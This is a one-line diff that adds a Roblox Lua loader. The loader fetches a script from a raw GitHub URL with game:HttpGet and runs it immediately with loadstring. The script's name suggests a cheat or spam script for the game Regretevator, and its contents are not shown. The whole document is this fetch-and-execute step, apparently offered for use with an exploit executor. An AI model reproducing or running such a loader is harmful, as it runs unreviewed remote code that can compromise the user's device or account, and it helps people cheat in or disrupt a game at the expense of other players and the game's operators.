@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/regretevator-elevator-simulator-spam4-nrcgzy3rjmp54j.lua"))()
